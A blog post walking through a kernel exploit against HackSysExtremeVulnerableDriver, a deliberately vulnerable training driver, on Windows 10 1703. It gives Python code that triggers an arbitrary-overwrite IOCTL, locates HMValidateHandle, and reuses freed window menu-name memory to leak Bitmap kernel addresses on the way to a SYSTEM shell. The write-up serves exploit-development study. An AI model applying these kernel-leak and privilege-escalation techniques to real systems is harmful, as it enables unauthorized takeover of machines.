---
layout:     post
title:      HackSysExtremeVulnerableDriver BitmapNecromancy
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 10 1703 jul x64  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Save this code as python script file.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
	print "[-] Couldn't get Device Driver handle."
	sys.exit(0)
buf = "A"*8 + "B"*8
buflen = len(buf)

kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
```

Let's trigger the vulnerability.
```
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x0000000001080E18
[+] WRITE_WHAT_WHERE Size: 0x10
[+] UserWriteWhatWhere->What: 0x4141414141414141
[+] UserWriteWhatWhere->Where: 0x4242424242424242
[+] Triggering Arbitrary Overwrite
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
```
Well, the trigger work fine.

In Win10 1703, Microsoft nulled the pKernelAddress in the GDI_CELL struct killing the old infoleak, review the last challenge,
it is the key point for our address to get pvscan0 Addr.
```
class GDICELL64(Structure):
    _fields_ = [("pKernelAddress", c_void_p),
                ("wProcessId", c_ushort), 
                ("wCount", c_ushort),
                ("wUpper", c_ushort),
                ("wType", c_ushort),
                ("pUserAddress", c_void_p)]
```


## 0x002 Exploit it

Luckily, there is another method to exploit Win10 1703. First, we should get the HMValidateHandle Addr, this is necssaary. Don't be afraid, it is painless.

HmValidateHandle is a very interesting function as we can provide it with a handle to a Window object and it will return the pointer to the user mapped tagWND object on the Desktop Heap, isn't that useful!

We may get the Addr of user32.IsMenu method, then, try to find out . 
```
kd> u user32!IsMenu
USER32!IsMenu:
00007fff`17d489e0 4883ec28        sub     rsp,28h
00007fff`17d489e4 b202            mov     dl,2
00007fff`17d489e6 e805380000      call    USER32!HMValidateHandle (00007fff`17d4c1f0)
00007fff`17d489eb 33c9            xor     ecx,ecx
00007fff`17d489ed 4885c0          test    rax,rax
00007fff`17d489f0 0f95c1          setne   cl
00007fff`17d489f3 8bc1            mov     eax,ecx
00007fff`17d489f5 4883c428        add     rsp,28h
```
Pay attention, after first 0xe8 byte opcode may be the Pointer to HMValidateHandle offset.

Try to compare with 0xe8 for every bytes after the user32.IsMenu method.
```
def findHMValidateHandle():
	global pHMValidateHandle

	kernel32.LoadLibraryA.restype = HMODULE
	hUser32 = kernel32.LoadLibraryA("user32.dll")

	kernel32.GetProcAddress.restype = c_ulonglong
	kernel32.GetProcAddress.argtypes = (HMODULE,LPCSTR)
	pIsMenu = kernel32.GetProcAddress(hUser32,"IsMenu")
	debug_print("[>] Locating HMValidateHandle()")
	debug_print("\t[+] user32.IsMenu: 0x%X" % pIsMenu)

	offset = 0
	pHMValidateHandle_offset = 0
	while(offset < 0x100):
		byte = cast(pIsMenu + offset, POINTER(c_byte))
		# if byte == 0xE8(232 - 128 - 128 = -24)
		if byte.contents.value == -24:
			pHMValidateHandle_offset = pIsMenu + offset + 1
			break;
		offset = offset + 1
	debug_print("\t[+] Pointer to HMValidateHandle offset: 0x%X" % pHMValidateHandle_offset)
	
	HMValidateHandle_offset = (cast(pHMValidateHandle_offset, POINTER(c_long))).contents.value
	debug_print("\t[+] HMValidateHandle offset: 0x%X" % HMValidateHandle_offset)

	# Add 0xb because relative offset of call starts from next instruction after call, which is 0xb bytes from start of user32.IsMenu
	pHMValidateHandle = pIsMenu + HMValidateHandle_offset + 0xb
	debug_print("\t[+] HMValidateHandle pointer: 0x%X" % pHMValidateHandle)
```

Next step, allocate a large Window menu name, free it and then allocate our Bitmap which will reuse the free'd memory, because the Window menu name (lpszMenuName) is allocated in the same Kernel pool as our bitmap. if we make the menu name larger than 4kb it ends up in the large pool which has low'ish entropy making this UAF style leak 100% reliable.

How to ensure that our predictions are completely correct？

Well, we may try to compare the lpszMenuName of reuse block with the previous freed block. Therefore, the kernelAddr of Bitmap objects is fully predictable.
```
def alloc_free_windows():
	global classNumber

	previous_entry = 0

	while (1):
		plpszMenuName = allocate_free_window()
		if previous_entry == plpszMenuName:
			return plpszMenuName
		previous_entry = plpszMenuName
		classNumber = classNumber + 1
```

Now, we only need to do the same jobs of last challenge, then, I successfully got a system cmd.
![](/assets/img/exploit/2018-08-10-hacksys-extreme-vulnerable-driver-bitmapnecromancy/0x001.png)